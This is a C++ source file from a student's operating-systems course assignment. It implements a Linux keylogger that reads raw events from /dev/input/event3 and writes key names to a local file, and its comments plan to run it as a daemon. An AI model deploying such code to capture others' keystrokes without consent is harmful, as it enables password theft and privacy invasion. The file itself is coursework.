// Operating Systems - CS444
// Spring 2023
// Sophia Carlone
// Keylogger Assignment
// Description
// Date
// Video link

/*
1. creating a deamon process in c/c++
2. keylogging to a string
2 ways:
    A. Reading keyboard events. On linux, reading them from /dev/input/eventX. (ie. event0)
find correct index. root privilage?
    B. Taking user input directly from stdin. (getchar(), etc.)
3. writing the string in step 2 to a file.


*/

//My computer has keyboard on event 3

#include <iostream>
#include <fstream>
#include <linux/input.h> //for input event 
#include <unistd.h> //for read()
#include <sys/stat.h>
#include <fcntl.h> //for O_RDONLY
#include <vector>
// #include <filesystem> //new library to learn about

using namespace std;
// using namespace std::filesystem;

vector<string> keycodes = {
        "RESERVED",
        "ESC",
        "1",
        "2",
        "3",
        "4",
        "5",
        "6",
        "7",
        "8",
        "9",
        "0",
        "MINUS",
        "EQUAL",
        "BACKSPACE",
        "TAB",
        "Q",
        "W",
        "E",
        "R",
        "T",
        "Y",
        "U",
        "I",
        "O",
        "P",
        "LEFTBRACE",
        "RIGHTBRACE",
        "ENTER",
        "LEFTCTRL",
        "A",
        "S",
        "D",
        "F",
        "G",
        "H",
        "J",
        "K",
        "L",
        "SEMICOLON",
        "APOSTROPHE",
        "GRAVE",
        "LEFTSHIFT",
        "BACKSLASH",
        "Z",
        "X",
        "C",
        "V",
        "B",
        "N",
        "M",
        "COMMA",
        "DOT",
        "SLASH",
        "RIGHTSHIFT",
        "KPASTERISK",
        "LEFTALT",
        "SPACE",
        "CAPSLOCK",
        "F1",
        "F2",
        "F3",
        "F4",
        "F5",
        "F6",
        "F7",
        "F8",
        "F9",
        "F10",
        "NUMLOCK",
        "SCROLLLOCK"
};

int main(){
    // ifstream in;
    ofstream out;
    string filename = "keys_logged.txt";
    // string keyboard_device = "/dev/input/event3";
    int in = open("/dev/input/event3", O_RDONLY); //open event file
    // int out = open("keys_logged.txt", O_APPEND); //open output file

    struct input_event ev; //for keyboard events

    // in.open(keyboard_device);
    out.open(filename);

    /*dont need to use threads because people can really only really give one keyboard input at a time
    *even if you try to press at the same time there is a slight difference. */

    while(true){
        // write(out, "HELLO", sizeof("HELLO"));
        // in.read(ev, sizeof(ev));
        read(in, &ev, sizeof(ev)); //read event file to event structure
        if((ev.type == EV_KEY) && (ev.value == 0)){ //EV_KEY means keyboard and a 0 value is a keypress
            // cout << ev.code << endl;
            // write(out, keycodes[ev.code].c_str(), sizeof(keycodes[ev.code]));
            out << keycodes[ev.code] << endl;
        }
   }
}



//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    // char c; //character (do it one at a time or can I do something more efficient)

    //     //getting keys
    //     c = getchar();
    //     out << c;
    //     if( c == '}') break;
 

 